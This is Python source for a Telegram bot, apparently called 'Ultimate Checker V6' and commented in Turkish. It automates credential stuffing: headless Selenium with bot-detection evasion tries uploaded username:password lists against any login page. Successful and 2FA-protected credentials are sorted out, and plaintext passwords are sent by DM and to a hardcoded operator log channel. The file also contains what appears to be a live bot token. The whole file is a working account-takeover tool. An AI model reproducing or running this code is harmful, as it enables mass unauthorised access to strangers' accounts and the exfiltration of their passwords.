import os
import re
import json
import time
import asyncio
import random
import logging
from datetime import datetime
from typing import List, Tuple, Dict, Optional
from urllib.parse import urlparse

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, NoSuchElementException, StaleElementReferenceException, ElementNotInteractableException, WebDriverException

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.enums import ParseMode
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ==================== AYARLAR ====================
BOT_TOKEN = "8278514160:AAF8qnkQD2Ll6oOLOWsZB2w3jxyuBB92mec"
LOG_CHANNEL_ID = -1003808448844  # Log kanalı

# Dosyalar
HITS_FILE = "hits.txt"
TWOFA_FILE = "2fa_hesaplar.txt"
RESULTS_FILE = "sonuclar.txt"

# Loglama
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Bot
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)

# ==================== STATE'LER ====================
class CheckerStates(StatesGroup):
    url_bekleniyor = State()
    dosya_bekleniyor = State()

# ==================== GÜÇLENDİRİLMİŞ CHECKER MOTORU ====================
class SmartChecker:
    def __init__(self):
        self.driver = None
        self.wait = None
    
    def init_driver(self):
        """Driver başlat - USB Penceresini Engelleyen Ayarlar"""
        try:
            self.quit_driver()  # Varsa eskiyi kapat
            
            chrome_options = Options()
            chrome_options.add_argument('--headless=new')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            
            # --- USB PENCEREYİ KAPATAN KODLAR ---
            chrome_options.add_argument("--disable-features=WebAuthentication")
            chrome_options.add_argument("--disable-features=WebAuth")
            chrome_options.add_argument("--disable-web-auth")
            chrome_options.add_argument("--disable-webauthn")
            
            chrome_options.add_argument('--disable-popup-blocking')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36')
            
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.wait = WebDriverWait(self.driver, 15)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            logger.info("✅ Driver başarıyla başlatıldı (USB koruması devre dışı)")
            
        except Exception as e:
            logger.error(f"❌ Driver başlatma hatası: {e}")
            self.driver = None
    
    def quit_driver(self):
        """Driver'ı güvenli kapat"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None
    
    def safe_interact(self, element, action="click", text=None):
        """Elementle etkileşime girer"""
        try:
            self.driver.execute_script("arguments[0].scrollIntoView({behavior: 'smooth', block: 'center'});", element)
            time.sleep(0.3)
            
            if action == "click":
                try:
                    element.click()
                except:
                    self.driver.execute_script("arguments[0].click();", element)
            
            elif action == "type":
                try:
                    element.clear()
                except:
                    pass
                
                try:
                    element.send_keys(text)
                except:
                    escaped_text = text.replace("'", "\\'")
                    self.driver.execute_script(f"arguments[0].value = '{escaped_text}';", element)
                    self.driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", element)
                    self.driver.execute_script("arguments[0].dispatchEvent(new Event('change', { bubbles: true }));", element)
                    
        except Exception as e:
            logger.debug(f"⚠️ Etkileşim hatası: {e}")
    
    def check_account(self, domain: str, username: str, password: str) -> Tuple[str, str]:
        """AŞAMALI GİRİŞ MANTIĞI"""
        try:
            # 1. AŞAMA: Kullanıcı Adını Bul ve Yaz
            user_field = None
            
            inputs = self.driver.find_elements(By.TAG_NAME, "input")
            for inp in inputs:
                if not inp.is_displayed():
                    continue
                
                inp_type = inp.get_attribute("type") or ""
                inp_name = (inp.get_attribute("name") or "").lower()
                inp_id = (inp.get_attribute("id") or "").lower()
                inp_placeholder = (inp.get_attribute("placeholder") or "").lower()
                
                if inp_type in ["text", "email", "tel"]:
                    if any(x in inp_name or x in inp_id or x in inp_placeholder for x in ["user", "email", "login", "kullanıcı", "e-posta"]):
                        user_field = inp
                        break
                    
                    if not user_field:
                        user_field = inp
            
            if not user_field:
                return "ERROR", "❌ Kullanıcı adı kutusu bulunamadı"
            
            self.safe_interact(user_field, "type", username)
            time.sleep(0.5)
            
            # 2. AŞAMA: Şifre alanı var mı?
            pass_field = None
            try:
                pass_fields = self.driver.find_elements(By.XPATH, "//input[@type='password']")
                for p in pass_fields:
                    if p.is_displayed():
                        pass_field = p
                        break
            except:
                pass
            
            # 3. AŞAMA: Şifre alanı YOKSA (Split Login)
            if not pass_field:
                logger.info("ℹ️ Şifre alanı yok, 'İleri' yapılıyor...")
                
                try:
                    forms = self.driver.find_elements(By.TAG_NAME, "form")
                    if forms:
                        self.driver.execute_script("arguments[0].submit();", forms[0])
                    else:
                        user_field.send_keys(Keys.RETURN)
                except:
                    user_field.send_keys(Keys.RETURN)
                
                time.sleep(3)
                
                try:
                    pass_field = self.wait.until(EC.presence_of_element_located((By.XPATH, "//input[@type='password']")))
                except:
                    page_source = self.driver.page_source.lower()
                    
                    error_keywords = ["incorrect", "wrong", "invalid", "failed", "hatalı", "yanlış", "bulunamadı"]
                    for err in error_keywords:
                        if err in page_source:
                            return "BAD", f"❌ {err}"
                    
                    return "ERROR", "❌ Şifre ekranı gelmedi"
            
            # 4. AŞAMA: Şifreyi Yaz
            if pass_field:
                logger.info("🔑 Şifre yazılıyor...")
                self.safe_interact(pass_field, "type", password)
                time.sleep(0.5)
                
                try:
                    buttons = self.driver.find_elements(By.TAG_NAME, "button")
                    submit_found = False
                    
                    for btn in buttons:
                        btn_text = btn.text.lower()
                        if btn.is_displayed() and any(x in btn_text for x in ["giriş", "login", "sign in", "oturum aç", "log in"]):
                            self.safe_interact(btn, "click")
                            submit_found = True
                            break
                    
                    if not submit_found:
                        pass_field.send_keys(Keys.RETURN)
                except:
                    pass_field.send_keys(Keys.RETURN)
            
            # 5. SONUÇ ANALİZİ
            return self.analyze_result(domain, username, password)
            
        except WebDriverException as e:
            if "10061" in str(e) or "no such window" in str(e):
                logger.error(f"⚠️ Driver çöktü: {e}")
                self.quit_driver()
            return "ERROR", f"Driver hatası"
            
        except Exception as e:
            logger.error(f"Kontrol hatası: {e}")
            return "ERROR", str(e)[:50]
    
    def analyze_result(self, domain: str, username: str, password: str) -> Tuple[str, str]:
        """Sonuç analizi - USB anahtar tespiti eklendi"""
        try:
            time.sleep(4)
            
            try:
                current_url = self.driver.current_url.lower()
            except:
                current_url = ""
            
            try:
                page_source = self.driver.page_source.lower()
            except:
                page_source = ""
            
            # 1. HATA KONTROLÜ
            bad_keywords = [
                "incorrect", "wrong", "invalid", "failed", "error",
                "hatalı", "yanlış", "başarısız", "bulunamadı",
                "doesn't exist", "not found", "geçersiz", "eşleşmiyor",
                "try again", "tekrar dene", "kullanıcı adı veya şifre",
                "username or password", "giriş başarısız", "login failed"
            ]
            
            for bad in bad_keywords:
                if bad in page_source:
                    return "BAD", f"❌ {bad}"
            
            # 2. 2FA KONTROLÜ (USB anahtar dahil)
            twofa_keywords = [
                "authentication code",
                "verification code",
                "device verification",
                "otp",
                "2fa",
                "sms",
                "security key",      # USB anahtar
                "güvenlik anahtarı", # USB anahtar
                "webauthn",          # USB anahtar
                "authenticator app",
                "recovery code",
                "two-factor",
                "mfa",
                "doğrulama kodu",
                "onay kodu",
                "google authenticator"
            ]
            
            for tf in twofa_keywords:
                if tf in page_source:
                    return "2FA", f"⚠️ {tf}"
            
            # 3. BAŞARILI GİRİŞ
            if domain.replace("www.", "") not in current_url and "login" not in current_url and "giris" not in current_url and "auth" not in current_url:
                if current_url and current_url != "about:blank":
                    return "HIT", "✅ URL değişti"
            
            success_keywords = ["dashboard", "profile", "account", "logout", "cikis", "hoşgeldin", "welcome", "settings"]
            for suc in success_keywords:
                if suc in page_source:
                    return "HIT", f"✅ {suc}"
            
            try:
                password_fields = self.driver.find_elements(By.XPATH, "//input[@type='password']")
                if password_fields and len(password_fields) > 0 and password_fields[0].is_displayed():
                    return "BAD", "❌ Login sayfasında kaldı"
            except:
                pass
            
            return "BAD", "❌ Sonuç alınamadı"
            
        except Exception as e:
            logger.error(f"Analiz hatası: {e}")
            return "ERROR", f"Analiz hatası"
    
    async def check_accounts(self, url: str, accounts: List[Tuple[str, str]], progress_msg: Message = None, user_id: int = None) -> Dict:
        """Tüm hesapları kontrol et - TÜM SONUÇLARI KAYDEDER"""
        domain = urlparse(url).netloc.replace("www.", "")
        
        self.init_driver()
        if not self.driver:
            await progress_msg.edit_text("❌ Driver başlatılamadı!")
            return {"HIT": [], "2FA": [], "BAD": [], "ERROR": []}
        
        results = {"HIT": [], "2FA": [], "BAD": [], "ERROR": []}
        total = len(accounts)
        
        # Tüm sonuçlar için dosya
        all_results = []
        
        for idx, (username, password) in enumerate(accounts, 1):
            if idx % 5 == 0 and progress_msg:
                try:
                    await progress_msg.edit_text(
                        f"🔄 Kontrol ediliyor...\n\n"
                        f"📊 İlerleme: {idx}/{total}\n"
                        f"✅ Hit: {len(results['HIT'])}\n"
                        f"⚠️ 2FA: {len(results['2FA'])}\n"
                        f"❌ Bad: {len(results['BAD'])}\n"
                        f"🚫 Hata: {len(results['ERROR'])}"
                    )
                except:
                    pass
            
            if idx % 10 == 0 or self.driver is None:
                logger.info("🔄 Periyodik driver yenileniyor...")
                self.quit_driver()
                self.init_driver()
            
            try:
                if self.driver:
                    self.driver.get(url)
                    time.sleep(2)
                else:
                    all_results.append(f"[ERROR] {username}:{password} - Driver ölü")
                    results["ERROR"].append(self._create_account_info(username, password, url, domain, "❌ Driver ölü"))
                    continue
                    
            except Exception as e:
                logger.error(f"Sayfaya gidilemedi: {e}")
                self.quit_driver()
                self.init_driver()
                
                try:
                    if self.driver:
                        self.driver.get(url)
                        time.sleep(2)
                    else:
                        all_results.append(f"[ERROR] {username}:{password} - Driver başlatılamadı")
                        results["ERROR"].append(self._create_account_info(username, password, url, domain, "❌ Bağlantı hatası"))
                        continue
                except:
                    all_results.append(f"[ERROR] {username}:{password} - Bağlantı hatası")
                    results["ERROR"].append(self._create_account_info(username, password, url, domain, "❌ Bağlantı hatası"))
                    continue
            
            result, message = self.check_account(domain, username, password)
            
            account_info = self._create_account_info(username, password, url, domain, message)
            results[result].append(account_info)
            
            # Tüm sonuçları listele
            emoji_map = {"HIT": "✅", "2FA": "⚠️", "BAD": "❌", "ERROR": "🚫"}
            all_results.append(f"[{emoji_map[result]}] {username}:{password} - {message}")
            
            # HER SONUÇ İÇİN BİLDİRİM (kullanıcıya DM)
            emoji = emoji_map[result]
            
            # Kullanıcıya detaylı DM (tüm sonuçlar)
            user_notify = (
                f"{emoji} <b>{result}</b>\n\n"
                f"👤 <b>Kullanıcı:</b> <code>{username}</code>\n"
                f"🔑 <b>Şifre:</b> <code>{password}</code>\n"
                f"🌐 <b>Site:</b> {domain}\n"
                f"📅 <b>Tarih:</b> {account_info['time']}\n"
                f"📌 <b>Durum:</b> {message}"
            )
            
            try:
                await bot.send_message(user_id, user_notify, parse_mode="HTML")
            except:
                pass
            
            # HIT veya 2FA ise log kanalına da at
            if result in ["HIT", "2FA"]:
                try:
                    await bot.send_message(LOG_CHANNEL_ID, user_notify, parse_mode="HTML")
                except Exception as e:
                    logger.warning(f"Log kanalına gönderilemedi: {e}")
                
                # Dosyaya kaydet
                filename = HITS_FILE if result == "HIT" else TWOFA_FILE
                with open(filename, "a", encoding="utf-8") as f:
                    f.write(f"{username}:{password} | {url} | {message} | {account_info['time']}\n")
            
            # Hata varsa biraz bekle
            if result == "ERROR":
                time.sleep(2)
            
            time.sleep(random.uniform(1, 2))
        
        # Tüm sonuçları dosyaya kaydet
        with open(RESULTS_FILE, "w", encoding="utf-8") as f:
            f.write(f"TARAMA SONUÇLARI - {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
            f.write(f"URL: {url}\n")
            f.write(f"Toplam Hesap: {total}\n")
            f.write(f"✅ Hit: {len(results['HIT'])}\n")
            f.write(f"⚠️ 2FA: {len(results['2FA'])}\n")
            f.write(f"❌ Bad: {len(results['BAD'])}\n")
            f.write(f"🚫 Hata: {len(results['ERROR'])}\n")
            f.write("="*50 + "\n\n")
            f.write("\n".join(all_results))
        
        self.quit_driver()
        return results
    
    def _create_account_info(self, username: str, password: str, url: str, domain: str, message: str) -> Dict:
        """Account info dict oluştur"""
        return {
            "username": username,
            "password": password,
            "url": url,
            "site": domain,
            "time": datetime.now().strftime("%H:%M:%S"),
            "message": message
        }

# ==================== BOT KEYBOARDS ====================

def main_keyboard() -> InlineKeyboardMarkup:
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🌐 URL Gir", callback_data="custom_url"))
    builder.row(InlineKeyboardButton(text="📊 Sonuçlar", callback_data="show_results"))
    return builder.as_markup()

def cancel_keyboard() -> InlineKeyboardMarkup:
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="◀️ İptal", callback_data="cancel"))
    return builder.as_markup()

# ==================== BOT HANDLER'LARI ====================

@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    
    await message.answer(
        "🚀 <b>ULTIMATE CHECKER V6</b>\n\n"
        "<b>Özellikler:</b>\n"
        "✅ USB/WebAuth penceresi engellendi\n"
        "✅ Tüm sonuçlar DM'e gelir\n"
        "✅ HIT/2FA sonuçları log kanalına gider\n"
        "✅ Herkes kullanabilir\n\n"
        "Aşağıdaki butonlardan işlemini seç:",
        reply_markup=main_keyboard(),
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "main_menu")
async def callback_main_menu(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text(
        "🚀 Ana menüye döndünüz.",
        reply_markup=main_keyboard(),
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "cancel")
async def callback_cancel(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text(
        "🚀 İşlem iptal edildi.",
        reply_markup=main_keyboard(),
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "custom_url")
async def callback_custom_url(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "🔧 <b>URL Girin</b>\n\n"
        "Kontrol edilecek site URL'sini girin:\n"
        "Örnek: <code>https://github.com/login</code>",
        reply_markup=cancel_keyboard(),
        parse_mode="HTML"
    )
    await state.set_state(CheckerStates.url_bekleniyor)
    await callback.answer()

@dp.message(CheckerStates.url_bekleniyor)
async def process_url(message: Message, state: FSMContext):
    url = message.text.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    await state.update_data(target_url=url)
    
    await message.answer(
        f"✅ URL kaydedildi: {url}\n\n"
        f"Şimdi TXT dosyasını gönder:",
        reply_markup=cancel_keyboard()
    )
    await state.set_state(CheckerStates.dosya_bekleniyor)

@dp.message(CheckerStates.dosya_bekleniyor)
async def process_file(message: Message, state: FSMContext):
    if not message.document:
        await message.answer("❌ Lütfen bir TXT dosyası gönder!")
        return
    
    file = await bot.get_file(message.document.file_id)
    file_content = await bot.download_file(file.file_path)
    content = file_content.read().decode('utf-8', errors='ignore')
    
    accounts = []
    for line in content.split('\n'):
        line = line.strip()
        if ':' in line:
            u, p = line.split(':', 1)
            accounts.append((u.strip(), p.strip()))
    
    if not accounts:
        await message.answer("❌ Dosyada geçerli hesap bulunamadı!")
        return
    
    data = await state.get_data()
    target_url = data['target_url']
    domain = urlparse(target_url).netloc.replace("www.", "")
    
    progress = await message.answer(
        f"🚀 Kontrol başlatılıyor...\n"
        f"🌐 Site: {domain}\n"
        f"📊 Hesap: {len(accounts)}\n"
        f"⏳ Lütfen bekleyin...\n\n"
        f"<i>Not: Tüm sonuçlar DM'den gelecek</i>",
        parse_mode="HTML"
    )
    
    checker = SmartChecker()
    results = await checker.check_accounts(target_url, accounts, progress, message.from_user.id)
    
    # ÖZET MESAJ
    summary = (
        f"✅ <b>KONTROL TAMAMLANDI!</b>\n\n"
        f"🌐 <b>Site:</b> {domain}\n"
        f"📊 <b>Toplam:</b> {len(accounts)}\n"
        f"✅ <b>Hit:</b> {len(results['HIT'])}\n"
        f"⚠️ <b>2FA:</b> {len(results['2FA'])}\n"
        f"❌ <b>Bad:</b> {len(results['BAD'])}\n"
        f"🚫 <b>Hata:</b> {len(results['ERROR'])}\n\n"
        f"📁 Tüm sonuçlar DM'den gönderildi!"
    )
    
    await progress.edit_text(summary, parse_mode="HTML")
    
    # Sonuç dosyasını gönder
    if os.path.exists(RESULTS_FILE):
        await message.answer_document(
            FSInputFile(RESULTS_FILE),
            caption="📊 Tüm sonuçlar"
        )
    
    # Hit ve 2FA dosyalarını da gönder
    if os.path.exists(HITS_FILE):
        with open(HITS_FILE, 'r') as f:
            if len(f.readlines()) > 0:
                await message.answer_document(
                    FSInputFile(HITS_FILE),
                    caption="✅ Başarılı hesaplar (Hit)"
                )
    
    if os.path.exists(TWOFA_FILE):
        with open(TWOFA_FILE, 'r') as f:
            if len(f.readlines()) > 0:
                await message.answer_document(
                    FSInputFile(TWOFA_FILE),
                    caption="⚠️ 2FA isteyen hesaplar"
                )
    
    checker.quit_driver()
    await state.clear()

@dp.callback_query(F.data == "show_results")
async def callback_show_results(callback: CallbackQuery):
    hit_count = 0
    twofa_count = 0
    bad_count = 0
    error_count = 0
    
    if os.path.exists(HITS_FILE):
        with open(HITS_FILE, 'r', encoding='utf-8') as f:
            hit_count = len(f.readlines())
    
    if os.path.exists(TWOFA_FILE):
        with open(TWOFA_FILE, 'r', encoding='utf-8') as f:
            twofa_count = len(f.readlines())
    
    if os.path.exists(RESULTS_FILE):
        with open(RESULTS_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
            bad_count = content.count("[❌]")
            error_count = content.count("[🚫]")
    
    stats_text = (
        f"📊 <b>İSTATİSTİKLER</b>\n\n"
        f"✅ <b>Hit:</b> {hit_count}\n"
        f"⚠️ <b>2FA:</b> {twofa_count}\n"
        f"❌ <b>Bad:</b> {bad_count}\n"
        f"🚫 <b>Hata:</b> {error_count}\n\n"
        f"📁 Sonuçlar dosyası: sonuclar.txt"
    )
    
    await callback.message.edit_text(
        stats_text,
        reply_markup=InlineKeyboardBuilder().row(
            InlineKeyboardButton(text="◀️ Geri", callback_data="main_menu")
        ).as_markup(),
        parse_mode="HTML"
    )
    await callback.answer()

# ==================== ANA FONKSİYON ====================
async def main():
    print("🚀 ULTIMATE CHECKER V6 BAŞLATILIYOR...")
    print("✅ Bot başarıyla başlatıldı!")
    print("🛡️ USB/WebAuth penceresi engellendi")
    print("📢 Tüm sonuçlar DM'e gidecek")
    print("📢 HIT/2FA sonuçları log kanalına da gidecek")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())